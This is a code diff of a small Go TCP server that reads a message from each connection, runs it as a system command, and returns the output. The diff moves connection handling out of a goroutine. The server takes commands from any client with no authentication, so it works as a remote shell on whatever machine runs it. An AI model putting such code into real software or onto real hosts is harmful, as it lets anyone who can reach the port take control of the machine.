@@ -31,32 +31,28 @@ func main() {
 		if err != nil {
 			log.Fatalf("encountered an error accepting connections: %s", err)
 		}
-		defer serv.Close()
 		fmt.Println("accepted connection")
 
-		go func(c net.Conn) {
-			defer c.Close()
+		buff := make([]byte, 1024)
+		size, _ := conn.Read(buff)
+		msg := buff[:size]
+		fmt.Printf("GOT: %s\n", msg)
 
-			buff := make([]byte, 1024)
-			size, _ := c.Read(buff)
-			msg := buff[:size]
-			fmt.Printf("GOT: %s\n", msg)
+		var out strings.Builder
+		vals := parse(string(msg))
 
-			var out strings.Builder
-			vals := parse(string(msg))
-
-			if len(vals) > 0 {
-				cmd := exec.Command(vals[0], vals[1:]...)
-				cmd.Stdout = &out
-				if cmdErr := cmd.Run(); cmdErr != nil {
-					fmt.Println(cmdErr)
-					c.Write([]byte(fmt.Sprintf("%s", cmdErr)))
-				} else {
-					fmt.Println(out.String())
-					c.Write([]byte(out.String()))
-				}
+		if len(vals) > 0 {
+			cmd := exec.Command(vals[0], vals[1:]...)
+			cmd.Stdout = &out
+			if cmdErr := cmd.Run(); cmdErr != nil {
+				fmt.Println(cmdErr)
+				conn.Write([]byte(fmt.Sprintf("%s", cmdErr)))
+			} else {
+				fmt.Println(out.String())
+				conn.Write([]byte(out.String()))
 			}
-		}(conn)
+		}
+		conn.Close()
 	}
 }
 
